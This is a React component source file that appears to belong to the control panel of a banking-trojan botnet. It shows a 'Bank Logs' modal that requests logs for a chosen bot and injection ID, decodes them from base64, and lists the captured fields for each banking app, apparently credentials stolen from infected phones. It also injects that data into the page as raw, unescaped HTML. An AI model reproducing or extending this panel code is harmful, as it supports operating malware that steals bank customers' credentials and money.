import React from 'react';
import SettingsContext from '../../Settings';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';
//import EditCommentUniversal from '../EditCommentUniversal';
//import { Link } from 'react-router-dom';
import ReactHtmlParser from 'react-html-parser';
import { try_eval } from '../../serviceF';

class BankLogModal extends React.Component {
  constructor(props) {
    super(props);
    this.state = {
      bankLogs: [],
      show: {},
      idinj: SettingsContext.CurrentSetBank,
      BotID: SettingsContext.CurrentSetBot,
    };
  }

  componentWillReceiveProps() {
    this.onLoadJson();
  }

  onLoadJson() {
    if (SettingsContext.CurrentSetBot.length < 1) {
      return;
    }
   // console.log(SettingsContext.CurrentSetBot, '---', SettingsContext.CurrentSetBank);
    let request = $.ajax({
      type: 'POST',
      url: SettingsContext.restApiUrl,
      data: {
        'params': new Buffer('{"request":"getLogsBank","idbot":"' + SettingsContext.CurrentSetBot + '","idinj":"' + SettingsContext.CurrentSetBank + '"}').toString('base64')
      }
    });

    request.done(function (msg) {
      try {
        let result = JSON.parse(msg);
        if (!isNullOrUndefined(result.error)) {
          SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
        }
        else {
          this.setState({
            bankLogs: result.logsBanks,
            BotID: SettingsContext.CurrentSetBot
          });
	//console.log(result, '-0-0-0-');
        }

      }
      catch (ErrMgs) {
        SettingsContext.ShowToastTitle('error', 'ERROR', 'Error loading bot info. Look console for more details.');
        console.log('Error - ' + ErrMgs);
      }
    }.bind(this));
  }

  CalculateBanks(bankss) {
    try {
      let banksList = '';
      bankss.split(':').forEach(function (element) {
        banksList += element + '<br>';
      });
      if (banksList.substring(0, 4) === '<br>') {
        return banksList.substring(4, banksList.length);
      }
      return banksList;
    }
    catch (err) {
      return "No have banks";
    }
  }

  ChangeDefaultComment(newComment) {
    this.props.BotListForceUpdate();
  }

  HideThisModal() {
    try_eval('$("#BankLogModal").modal("hide");');
  }

  componentDidUpdate() {
    try_eval('UpdateToolTips();');
  }

  componentDidMount() {
    try_eval('UpdateToolTips();');
  }

  ListLogs(logs) {
      let liobj = '';

      for(let obj in logs) {
          liobj += '<li class="list-group-item">' + obj + ': ' + logs[obj] + '</li>';
      }

      return (
         <tr><td colspan="2"><ul class="list-group" dangerouslySetInnerHTML={{__html: liobj}}  /></td></tr>
      );
  }

  render() {

    //if (!isNullOrUndefined(this.state.myObjJS)) {
      //var idinj = this.state.myObjJS['idinj'];
      //var idbot = this.state.myObjJS['idbot'];
      //var application = this.state.myObjJS['application'];

      //try {
      //  var logs = new Buffer(this.state.myObjJS['logs'].toString() === null ? '' : this.state.myObjJS['logs'].toString(), 'base64').toString('utf-8');
      //  logs = JSON.parse(logs);
     // }
     // catch (err) { }
	 //console.log(idinj, idbot, application, logs, '----');
     //var logsView = "";
     //for (const key in logs) {
     // if (Object.hasOwnProperty.call(logs, key)) {
     //    const value = logs[key];
     //      logsView += `<tr><td>${key}</td><td>${value}</td></tr>`;
     //    }
     // }
    //}
    return (
      //<!-- Modal -->
      <div className="modal fade" id="BankLogModal" tabIndex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
        <div className="modal-dialog modal-dialog-centered" role="document">
          <div className="modal-content">
            <div className="modal-header">
              <h5 className="modal-title" id="exampleModalLongTitle"><b>{'Bank Logs - '}</b><i>{SettingsContext.CurrentSetBot}</i></h5>
              <button type="button" className="close" data-dismiss="modal" aria-label="Close">
                <span aria-hidden="true">&times;</span>
              </button>
            </div>
            <div style={({ marginBottom: '15px' })}>
              <table className="table table-striped table-dark table-hover ">
               {/*  <tr>
                  <td className="fullIconSizeTB" scope="row">Id Inj</td>
                  <td>{idinj}</td>
                </tr>
		<tr>
                  <td className="fullIconSizeTB" scope="row">Id Bot</td>
                  <td>{idbot}</td>
                </tr>
		<tr>
                  <td className="fullIconSizeTB" scope="row">Id App</td>
                  <td>{application}</td>
                </tr>
		<tr>
                  <td className="fullIconSizeTB" scope="row">Id App</td>
                  <td>{application}</td>
                </tr>
		<tr>
                  <td className="fullIconSizeTB" scope="row">
		    <i class="far fa-clipboard-list"></i>
		  </td>
                  <td></td>
                </tr> */}
		{this.state.bankLogs.map((bankLog, index) => {
			try {
       				 var logs = new Buffer(bankLog['logs'].toString() === null ? '' : bankLog['logs'].toString(), 'base64').toString('utf-8');
       				 logs = JSON.parse(logs);
      			}
      			catch (err) { }
        		 //console.log(idinj, idbot, application, logs, '----');
     			//var logsView = "";
     			//for (const key in logs) {
     			//	 if (Object.hasOwnProperty.call(logs, key)) {
     		   	//	 const value = logs[key];
          		//	 logsView += `<tr><td>${key}</td><td>${value}</td></tr>`;
         		//	}
      			//}
			return <React.Fragment key={index}><tr><td>{ bankLog['application'] }</td><td><i class={`far fa-eye${this.state.show[index + 1] ? "-slash": ""}`} style={{cursor: "pointer"}}  onClick={() => { this.setState({ show: {...this.state.show, [index+1]: !this.state.show[index + 1]} }) }}></i></td></tr>{this.state.show[index+1] &&  this.ListLogs(logs) }</React.Fragment>;
		})}
              </table>
            </div>
          </div>
        </div>
      </div>
    );
  }
}

export default BankLogModal;
